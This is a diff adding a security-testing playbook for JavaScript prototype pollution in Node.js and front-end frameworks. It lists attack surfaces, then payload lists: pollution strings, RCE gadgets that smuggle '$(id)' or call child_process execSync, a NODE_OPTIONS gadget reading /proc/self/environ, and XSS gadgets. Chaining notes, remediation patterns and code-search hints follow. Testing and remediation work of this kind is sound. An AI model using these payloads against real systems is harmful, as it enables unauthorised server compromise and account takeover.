@@ -1,0 +1,95 @@
+---
+name: prototype_pollution
+description: JavaScript Prototype Pollution testing covering object pollution, gadget chains, and RCE in Node.js
+category: vulnerabilities
+version: "1.0"
+tags: ["prototype-pollution", "javascript", "nodejs", "rce", "owasp-a01", "owasp-a03"]
+applies_to: ["Node.js", "Express", "Lodash", "jQuery", "AngularJS", "React", "Vue", "Next.js", "NestJS", "Electron"]
+severity: "HIGH"
+confidence_threshold: "MEDIUM"
+---
+attack_surface:
+  - "JSON merge/extend operations (_.merge, $.extend, Object.assign)"
+  - "Recursive object merging utilities"
+  - "Query string parsing (qs, querystring)"
+  - "JSON body parsing with user-controlled keys"
+  - "Configuration loading from user input"
+  - "Clone/deepCopy functions"
+  - "State management (Redux, Vuex) with user input"
+
+detection_channels:
+  - "Object.prototype pollution: __proto__, constructor, prototype"
+  - "Property existence check: polluted in Object.prototype"
+  - "Gadget chain: Kibana, Express, Lodash, Mongoose"
+  - "RCE: child_process, require, Function constructor"
+  - "DoS: Object.prototype.toString, valueOf pollution"
+  - "Client-side: DOM XSS via polluted config"
+
+payload_primitives:
+  basic_pollution:
+    - "__proto__[polluted]=true"
+    - "constructor[prototype][polluted]=true"
+    - "prototype[polluted]=true"
+  nested_pollution:
+    - "a.__proto__.b=value"
+    - "a.constructor.prototype.b=value"
+  array_pollution:
+    - "[__proto__]=value"
+    - "[constructor][prototype]=value"
+  rce_gadgets:
+    - "__proto__[env][NODE_OPTIONS]=--require /proc/self/environ"
+    - "constructor[prototype][env][NODE_OPTIONS]=--require /proc/self/environ"
+    - "__proto__[shell]=$(id)"
+    - "constructor[prototype][shell]=$(id)"
+  lodash_gadget:
+    - "__proto__[sourceURL]=javascript:alert(1)//"
+    - "constructor[prototype][sourceURL]=javascript:alert(1)//"
+  mongoose_gadget:
+    - "__proto__[toJSON]=function(){return process.mainModule.require('child_process').execSync('id')}"
+  express_gadget:
+    - "__proto__[view][engine]=ejs"
+    - "__proto__[view][root]=/proc/self/environ"
+  query_string:
+    - "?__proto__[x]=y"
+    - "?constructor[prototype][x]=y"
+    - "?a[__proto__][x]=y"
+
+false_positive_validation:
+  - "Verify pollution persists: `({}).polluted === true`"
+  - "Check for actual gadget chain execution (not just pollution)"
+  - "Test in target Node.js version (gadgets version-specific)"
+  - "Confirm not mitigated by --disable-proto=throw (Node 12+)"
+  - "Validate RCE via out-of-band or direct output"
+  - "Check for Object.freeze(Object.prototype) protection"
+
+chaining_guidance:
+  - "Prototype Pollution + RCE Gadget → Full server compromise"
+  - "Prototype Pollution + Express/Koa → Route manipulation, RCE"
+  - "Prototype Pollution + Mongoose → Query injection, RCE"
+  - "Prototype Pollution + Lodash → Template injection, XSS"
+  - "Client-side Pollution + DOM XSS → Account takeover"
+  - "Pollution + Config → Feature flag bypass, auth bypass"
+
+remediation_patterns:
+  - "Use Object.create(null) for maps/dictionaries"
+  - "Freeze prototypes: Object.freeze(Object.prototype), Object.freeze(Object)"
+  - "Validate keys: reject __proto__, constructor, prototype"
+  - "Use --disable-proto=throw (Node.js 12+)"
+  - "Use safe merge: lodash.mergeWith with customizer, or deepmerge with options"
+  - "Schema validation: Joi, Zod, Yup for all user input"
+  - "Avoid recursive merge with user-controlled objects"
+
+code_locations:
+  - "Search for recursive merge:"
+  - "  `_.merge(target, source)`, `$.extend(true, target, source)`"
+  - "  `Object.assign(target, source)`, `...spread` with user input"
+  - "Find query parsing: `qs.parse()`, `querystring.parse()`"
+  - "Check config loading: `config = {...config, ...userInput}`"
+  - "Identify clone functions: `cloneDeep`, `deepClone`, `JSON.parse(JSON.stringify)`"
+  - "Look for user input in object keys: `obj[userKey] = value`"
+
+references:
+  - "https://portswigger.net/web-security/prototype-pollution"
+  - "https://github.com/BlackFan/prototype-pollution-nsec18"
+  - "https://blog.huli.tw/2021/03/20/en/prototype-pollution-attack/"
+  - "https://github.com/HoLyVieR/prototype-pollution-nsec18"
